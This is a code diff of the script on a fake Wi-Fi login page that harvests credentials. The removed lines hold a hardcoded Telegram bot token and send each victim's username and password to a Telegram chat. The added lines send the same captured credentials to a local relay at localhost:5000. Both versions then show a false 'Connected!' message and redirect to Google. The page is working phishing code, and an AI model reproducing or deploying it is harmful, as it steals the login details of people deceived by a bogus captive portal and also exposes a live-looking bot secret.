@@ -85,42 +85,40 @@
   </html>  
 
   <script>
-    const BOT_TOKEN = '7668606367:AAH4aqE2z8Sm8exTBd5k-yJ4C2PQ39ALUB0'; 
-    const CHAT_ID = '5711433197';
-    
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault(); 
+  document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
 
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      
-      // Validate email or mobile number
-      const isEmail = username.includes('@');
-      const isMobile = /^[0-9]{10}$/.test(username); // Checks if it contains only 10 digits
-      
-      if (!isEmail && !isMobile) {
-        alert("Please enter a valid email or mobile number.");
-        return;
-      }
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
 
-      // Validate password: minimum 8 characters, at least one letter and one number
-      const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d).{8,}$/;
-      if (!passwordRegex.test(password)) {
-        alert("Password must be at least 8 characters long and include both letters and numbers.");
-        return;
-      }
-      
-      // Send data to Telegram
-      const message = `🔓 Wi-Fi Login\n📧 Username: ${username}\n🔑 Password: ${password}`;
+    const isEmail = username.includes('@');
+    const isMobile = /^[0-9]{10}$/.test(username);
+    if (!isEmail && !isMobile) {
+      alert("Please enter a valid email or mobile number.");
+      return;
+    }
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
-        .then(response => {
-          alert("Connected! Redirecting to the internet...");
-          window.location.href = "https://www.google.com"; 
-        })
-        .catch(error => {
-          alert("Error connecting to Wi-Fi.");
-          console.error(error);
-        });
-    });
-  </script>
+    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d).{8,}$/;
+    if (!passwordRegex.test(password)) {
+      alert("Password must be at least 8 characters long and include both letters and numbers.");
+      return;
+    }
+
+    const userMsg = `🔓 Wi-Fi Login\n📧 Username: ${username}\n🔑 Password: ${password}`;
+
+    try {
+      const res = await fetch("http://localhost:5000/send-message", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ message: userMsg })
+      });
+
+      const data = await res.json();
+      alert("Connected! Redirecting to the internet...");
+      window.location.href = "https://www.google.com";
+    } catch (error) {
+      alert("Failed to connect.");
+      console.error(error);
+    }
+  });
+</script>
